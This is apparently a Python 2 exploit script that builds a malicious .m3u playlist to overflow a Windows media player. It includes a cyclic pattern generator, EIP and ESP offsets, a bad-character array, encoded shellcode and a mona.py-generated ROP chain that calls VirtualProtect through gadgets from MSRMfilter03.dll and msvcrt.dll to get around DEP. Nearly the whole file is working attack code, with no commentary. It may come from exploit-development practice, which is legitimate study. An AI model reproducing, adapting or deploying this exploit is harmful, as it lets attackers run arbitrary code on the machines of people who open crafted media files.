#!/usr/bin/python
import sys
from subprocess import call
from struct import pack
import codecs
import struct

def c(x):
  return pack('<L', x)

def pc(size):
	char1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	char2 = "abcdefghijklmnopqrstuvwxyz"
	char3 = "0123456789"

	charcnt = 0
	pattern = ""
	max = int(size)
	while charcnt < max:
		for ch1 in char1:
			for ch2 in char2:
				for ch3 in char3:
					if charcnt < max:
						pattern = pattern + ch1
						charcnt = charcnt + 1
					if charcnt < max:
						pattern = pattern + ch2
						charcnt = charcnt + 1
					if charcnt < max:
						pattern = pattern + ch3
						charcnt = charcnt + 1
	return pattern

def junk(size):
	return "\x90"*size

buffer = "c:\\"
exploit = ""
buffsize = 27000
#EIP at 5829 & 26109
# ESP at 5837
EIP = 26109
ESP = 26117 # Length 883

#x00 x0a
badchars = ("\x4f\x4d\x41\x49\x44\x4f\x4d\x41\x49\x44\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


shellcode = ("\xb8\xe8\x67\x8c\x38\xdb\xdf\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x31\x31\x45\x13\x83\xed\xfc\x03\x45\xe7\x85\x79\xc4\x1f\xcb"
"\x82\x35\xdf\xac\x0b\xd0\xee\xec\x68\x90\x40\xdd\xfb\xf4\x6c"
"\x96\xae\xec\xe7\xda\x66\x02\x40\x50\x51\x2d\x51\xc9\xa1\x2c"
"\xd1\x10\xf6\x8e\xe8\xda\x0b\xce\x2d\x06\xe1\x82\xe6\x4c\x54"
"\x33\x83\x19\x65\xb8\xdf\x8c\xed\x5d\x97\xaf\xdc\xf3\xac\xe9"
"\xfe\xf2\x61\x82\xb6\xec\x66\xaf\x01\x86\x5c\x5b\x90\x4e\xad"
"\xa4\x3f\xaf\x02\x57\x41\xf7\xa4\x88\x34\x01\xd7\x35\x4f\xd6"
"\xaa\xe1\xda\xcd\x0c\x61\x7c\x2a\xad\xa6\x1b\xb9\xa1\x03\x6f"
"\xe5\xa5\x92\xbc\x9d\xd1\x1f\x43\x72\x50\x5b\x60\x56\x39\x3f"
"\x09\xcf\xe7\xee\x36\x0f\x48\x4e\x93\x5b\x64\x9b\xae\x01\xe2"
"\x5a\x3c\x3c\x40\x5c\x3e\x3f\xf4\x35\x0f\xb4\x9b\x42\x90\x1f"
"\xd8\xbd\xda\x02\x48\x56\x83\xd6\xc9\x3b\x34\x0d\x0d\x42\xb7"
"\xa4\xed\xb1\xa7\xcc\xe8\xfe\x6f\x3c\x80\x6f\x1a\x42\x37\x8f"
"\x0f\x21\xd6\x03\xd3\x88\x7d\xa4\x76\xd5")
def create_rop_chain():

	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	  0x10027f5d,  # POP EAX # RETN [MSRMfilter03.dll] 
	  0x76cd1104,  # ptr to &VirtualProtect() [IAT msvcrt.dll]
	  0x1002e0c8,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSRMfilter03.dll] 
	  0x1001a788,  # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN [MSRMfilter03.dll] 
	  0x41414141,  # Filler (compensate)
	  0x41414141,  # Filler (compensate)
	  0x41414141,  # Filler (compensate)
	  0x1002b549,  # POP EBP # RETN [MSRMfilter03.dll] 
	  0x1001b058,  # & push esp # ret  [MSRMfilter03.dll]
	  0x10026f2b,  # POP EAX # RETN [MSRMfilter03.dll] 
	  0x41f10201,  # put delta into eax (-> put 0x00000201 into ebx)
	  0x10027682,  # ADD EAX,BE0F0000 # RETN [MSRMfilter03.dll] 
	  0x1001bdee,  # PUSH EAX # MOV EAX,1 # POP EBX # ADD ESP,8 # RETN [MSRMfilter03.dll] 
	  0x41414141,  # Filler (compensate)
	  0x41414141,  # Filler (compensate)
	  #0x00000000,  # [-] Unable to find gadget to put 00000040 into edx
	  0x100145a5,  # POP ECX # RETN [MSRMfilter03.dll] 
	  0x1005f4f1,  # &Writable location [MSRMfilter03.dll]
	  0x1002bc6a,  # POP EDI # RETN [MSRMfilter03.dll] 
	  0x1001c121,  # RETN (ROP NOP) [MSRMfilter03.dll]
	  0x1002976e,  # POP EAX # RETN [MSRMfilter03.dll] 
	  0x90909090,  # nop
	  0x76d6c35c,  # PUSHAD # RETN [msvcrt.dll] 
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

print len(rop_chain)
exploit += junk(EIP-len(exploit))
exploit += c(0x1001263f) #pivot 8
exploit += junk(4)
exploit += "B"*8 #ESP
# exploit += badchars
exploit += rop_chain
exploit += junk(20)
exploit += shellcode
exploit += junk(20)
exploit += junk(buffsize-len(exploit)) #ESP is now here


print "Exploit size %s" % len(exploit)

exploit += ".mp3"
print "[+] Creating malicious file"
print "[+] exploit.m3u"

buffer +=exploit
file = open("/Users/omaidfaizyar/Desktop/VM/exploit.m3u","w")
file.write(buffer)
file.close()



file = open("/Users/omaidfaizyar/Desktop/VM/badchars.bin","wb")
file.write(badchars)
file.close()